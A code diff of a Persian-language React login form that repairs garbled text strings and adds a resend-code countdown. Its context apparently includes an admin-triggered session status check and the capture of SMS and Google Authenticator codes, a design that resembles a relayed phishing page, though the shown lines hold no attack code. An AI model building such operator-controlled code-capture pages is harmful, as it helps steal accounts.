@@ -214,7 +214,7 @@ export const LoginForm = () => {
         setHasError(false);
         break;
       case "check_status":
-        // بررسی دقیق وضعیت ��اربر با Enhanced Offline Detection
+        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
         console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
@@ -493,7 +493,7 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تایی�� نادرست است. لطفا دوباره ��لاش کنید." });
+      setErrors({ verifyCode: "کد تایی�� نادرست است. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -580,7 +580,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ارس��ل کد. لط��ا دوباره تلاش کنید.",
+        googleCode: "خطا در ارس��ل کد. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -2239,62 +2239,81 @@ export const LoginForm = () => {
 
               {/* Countdown Timer */}
               <div style={{ marginTop: "8px" }}>
-                <span
-                  style={{
-                    borderColor: "rgba(0, 0, 0, 0.6)",
-                    color: "rgba(0, 0, 0, 0.6)",
-                    display: "inline",
-                    fontSize: "14px",
-                    lineHeight: "24.01px",
-                    outlineColor: "rgba(0, 0, 0, 0.6)",
-                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
-                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
-                  }}
-                >
-                  کد را دریافت نکردید؟
-                </span>
-                <button
-                  tabIndex={0}
-                  type="button"
-                  onClick={() => setCountdown(60)}
-                  style={{
-                    alignItems: "center",
-                    borderBottomLeftRadius: "8px",
-                    borderBottomRightRadius: "8px",
-                    borderColor: "rgb(0, 122, 255)",
-                    borderRadius: "8px",
-                    borderTopLeftRadius: "8px",
-                    borderTopRightRadius: "8px",
-                    color: "rgb(0, 122, 255)",
-                    cursor: "pointer",
-                    display: "inline-flex",
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    justifyContent: "center",
-                    lineHeight: "24.01px",
-                    outlineColor: "rgb(0, 122, 255)",
-                    paddingBottom: "4px",
-                    paddingLeft: "8px",
-                    paddingRight: "8px",
-                    paddingTop: "4px",
-                    position: "relative",
-                    textAlign: "center",
-                    textDecorationColor: "rgb(0, 122, 255)",
-                    textEmphasisColor: "rgb(0, 122, 255)",
-                    textTransform: "uppercase",
-                    transitionBehavior: "normal, normal, normal",
-                    transitionDelay: "0s, 0s, 0s",
-                    transitionDuration: "0.25s, 0.25s, 0.25s",
-                    transitionProperty: "background-color, box-shadow, border-color",
-                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
-                    userSelect: "none",
-                    verticalAlign: "middle",
-                    backgroundColor: "rgba(0, 0, 0, 0)",
-                    border: "none",
-                  }}
-                >
-                  ارسال مجدد
-                </button>
+                {countdown > 0 ? (
+                  <span
+                    style={{
+                      borderColor: "rgba(0, 0, 0, 0.6)",
+                      color: "rgba(0, 0, 0, 0.6)",
+                      display: "inline",
+                      fontSize: "14px",
+                      lineHeight: "24.01px",
+                      outlineColor: "rgba(0, 0, 0, 0.6)",
+                      textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                      textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                    }}
+                  >
+                    ارسال مجدد پس از {countdown} ثانیه
+                  </span>
+                ) : (
+                  <>
+                    <span
+                      style={{
+                        borderColor: "rgba(0, 0, 0, 0.6)",
+                        color: "rgba(0, 0, 0, 0.6)",
+                        display: "inline",
+                        fontSize: "14px",
+                        lineHeight: "24.01px",
+                        outlineColor: "rgba(0, 0, 0, 0.6)",
+                        textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                        textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                        marginLeft: "8px",
+                      }}
+                    >
+                      کد را دریافت نکردید؟
+                    </span>
+                    <button
+                      tabIndex={0}
+                      type="button"
+                      onClick={() => setCountdown(60)}
+                      style={{
+                        alignItems: "center",
+                        borderBottomLeftRadius: "8px",
+                        borderBottomRightRadius: "8px",
+                        borderRadius: "8px",
+                        borderTopLeftRadius: "8px",
+                        borderTopRightRadius: "8px",
+                        color: "rgb(0, 122, 255)",
+                        cursor: "pointer",
+                        display: "inline-flex",
+                        fontSize: "14px",
+                        fontWeight: "500",
+                        justifyContent: "center",
+                        lineHeight: "24.01px",
+                        outlineColor: "rgb(0, 122, 255)",
+                        paddingBottom: "4px",
+                        paddingLeft: "8px",
+                        paddingRight: "8px",
+                        paddingTop: "4px",
+                        position: "relative",
+                        textAlign: "center",
+                        textDecorationColor: "rgb(0, 122, 255)",
+                        textEmphasisColor: "rgb(0, 122, 255)",
+                        textTransform: "uppercase",
+                        transitionBehavior: "normal, normal, normal",
+                        transitionDelay: "0s, 0s, 0s",
+                        transitionDuration: "0.25s, 0.25s, 0.25s",
+                        transitionProperty: "background-color, box-shadow, border-color",
+                        transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                        userSelect: "none",
+                        verticalAlign: "middle",
+                        backgroundColor: "rgba(0, 0, 0, 0)",
+                        border: "none",
+                      }}
+                    >
+                      ارسال مجدد
+                    </button>
+                  </>
+                )}
               </div>
 
               {/* Action Buttons */}
@@ -3530,7 +3549,7 @@ export const LoginForm = () => {
                         <span>در حال ار��ال کد...</span>
                       </div>
                     ) : (
-                      "ارسال کد تا��ید"
+                      "ارسال کد تایید"
                     )}
                   </button>
                 </div>
